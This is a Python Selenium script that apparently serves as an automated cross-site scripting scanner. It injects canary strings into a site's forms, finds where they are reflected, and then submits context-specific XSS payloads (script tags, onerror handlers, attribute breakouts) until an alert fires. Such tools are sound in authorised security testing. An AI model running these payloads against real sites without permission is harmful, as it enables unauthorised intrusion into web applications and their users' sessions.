import random
import string
import sys
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.common.exceptions import NoSuchElementException
from selenium.common.exceptions import NoAlertPresentException
from selenium.common.exceptions import UnexpectedAlertPresentException

driver = webdriver.Firefox()
url = sys.argv[1]
driver.get(url)


def initial_form():
    # declaring variable that will be returned
    ran_input = []
    # try, except prevents code from crashing due to not finding the element and raising no such element exception
    try:
        # look for text and email inputs and textarea
        if driver.find_element(By.XPATH, "//input[@type='text']"):
            text_inputs = driver.find_elements(By.XPATH, "//input[@type='text']")
            for text_input in text_inputs:
                # check if it has a pattern and is required
                if text_input.get_attribute('pattern'):
                    if text_input.get_attribute('required'):
                        print("there's a required input with a specific text pattern required")
                    else:
                        print("this isn't required")
            # otherwise generate random string and send keys
                else:
                    ran = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
                    ran_input.append(ran)
                    text_input.send_keys(ran)

        if driver.find_element(By.XPATH, '//textarea'):
            text_areas = driver.find_elements(By.XPATH, "//textarea")
            for text_area in text_areas:
                if text_area.get_attribute('pattern'):
                    if text_area.get_attribute('required'):
                        print("there's a required input with a specific text pattern required")
                else:
                    ran = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
                    ran_input.append(ran)
                    text_area.send_keys(ran)

        if driver.find_element(By.XPATH, "//input[@type='email']"):
            emails = driver.find_elements(By.XPATH, "//input[@type='email']")
            for email in emails:
                ran = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
                ran_input.append(ran)
                email.send_keys(ran + "@gmail.com")
    except NoSuchElementException:
        pass

    # find and click button to submit form
    button = driver.find_element(By.XPATH, "//button[@type='submit']")
    button.click()
    return ran_input


def search_site(inputs):
    html_lines = {}
    # get page source to search for strings in html
    get_source = driver.page_source
    for ran in inputs:
        for line in get_source.splitlines():
            if ran in line:
                html_lines.update({line: ran})
                print(line)
    return html_lines


def get_context(html_lines):
    context = []
    for html in html_lines:
        # getting the string in the html
        ran = html_lines[html]
        split_html = html.split(ran)
        after = split_html[1]
        print(after)
        if after[:2] == "'<" or after[:1] == "<" or after[:2] == '"<':
            context.append("between")
            print(context)
        elif after[:2] == "'>" or after[:2] == '">' or after[:1] == ">":
            context.append("within")
            print(context)
        else:
            context.append("other")
            print(context)
    return context


def crawl_site(inputs):
    links = []
    found_endpoint = False
    while not found_endpoint:
        page_links = driver.find_elements(By.XPATH, "//a[@href]")
        for link in page_links:
            print(link.get_attribute("href"))
            if link not in links:
                links.append(link.get_attribute("href"))
        if not links:
            return False
        next_page = links.pop()
        driver.get(next_page)
        if search_site(inputs):
            return driver.current_url


def dtr_payload(context):
    if context == "between":
        betw_load = ["<img src=1 onerror=alert(1)>", "<script>alert(document.domain)</script>"]
        return betw_load

    elif context == "within":
        in_load = ['" autofocus onfocus=alert(document.domain) x="', '"><script>alert(document.domain)</script>']
        return in_load
    else:
        java_load = ["</script><img src=1 onerror=alert(document.domain)>", "'-alert(document.domain)-'",
                     "';alert(document.domain)//", "\\';alert(document.domain)//", "onerror=alert;throw 1",
                     "&apos;-alert(document.domain)-&apos;", "${alert(document.domain)}"
                     ]
        return java_load


def submit_form(payload):
    # sometimes the javascript popup doesn't get caught by is_script and only is triggered when trying to submit the next payload
    try:
        try:
            # look for text and email inputs and textarea
            if driver.find_element(By.XPATH, "//input[@type='text']"):
                text_inputs = driver.find_elements(By.XPATH, "//input[@type='text']")
                for text_input in text_inputs:
                    # check if it has a pattern and is required
                    if text_input.get_attribute('pattern'):
                        if text_input.get_attribute('required'):
                            print("there's a required input with a specific text pattern required")
                # otherwise submit the payload
                    else:
                        text_input.clear()
                        text_input.send_keys(payload)
                        print("submitting payload: " + payload)

            if driver.find_element(By.XPATH, '//textarea'):
                text_areas = driver.find_elements(By.XPATH, "//textarea")
                for text_area in text_areas:
                    if text_area.get_attribute('pattern'):
                        if text_area.get_attribute('required'):
                            print("there's a required input with a specific text pattern required")
                    else:
                        text_area.clear()
                        text_area.send_keys(payload)
                        print("submitting payload: " + payload)

            if driver.find_element(By.XPATH, "//input[@type='email']"):
                emails = driver.find_elements(By.XPATH, "//input[@type='email']")
                for email in emails:
                    ran = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
                    email.clear()
                    email.send_keys(ran + "@gmail.com")
        except NoSuchElementException:
            pass
    except UnexpectedAlertPresentException:
        return False

    button = driver.find_element(By.XPATH, "//button[@type='submit']")
    button.click()
    return True


def script_check():
    try:
        if driver.switch_to.alert:
            return True
        else:
            return False
    except NoAlertPresentException:
        pass


if __name__ == "__main__":
    # submit initial query
    form_inputs = initial_form()

    # look for strings submitted in form
    in_html = search_site(form_inputs)
    is_script = False
    # if strings were in html, determine their context
    if in_html:
        # get context for each line containing the random strings
        got_contexts = get_context(in_html)
        for got_context in got_contexts:
            # determine payload based on context
            use_payloads = dtr_payload(got_context)
            # loop through payloads until there are  either no more or xss is detected
            for use_payload in use_payloads:
                # submit form again with payload and break if there were any pop ups while trying to submit payload
                if not submit_form(use_payload):
                    print("pop up detected while submitting payload")
                    is_script = True
                    break
                # check for popup
                is_script = script_check()

                if is_script:
                    print("xss vulnerability detected")
                    break
            if is_script:
                break
    else:
        # time to crawl through the site looking for an exit point to the input
        exit_point = crawl_site(form_inputs)
        if exit_point:
            in_html = search_site(form_inputs)
            # get context for each line containing the random strings
            got_contexts = get_context(in_html)
            for got_context in got_contexts:
                # determine payload based on context
                use_payloads = dtr_payload(got_context)
                # loop through payloads until there are  either no more or xss is detected
                for use_payload in use_payloads:
                    # submit form again with payload and break if there were any pop ups while trying to submit payload
                    if not submit_form(use_payload):
                        print("pop up detected while submitting payload")
                        is_script = True
                        break
                    # go back to exit point to check for popups
                    driver.get(exit_point)
                    # check for popup
                    is_script = script_check()

                    if is_script:
                        print("xss vulnerability detected")
                        break
                if is_script:
                    break
        else:
            print("There are no xss vulnerabilities in this site")

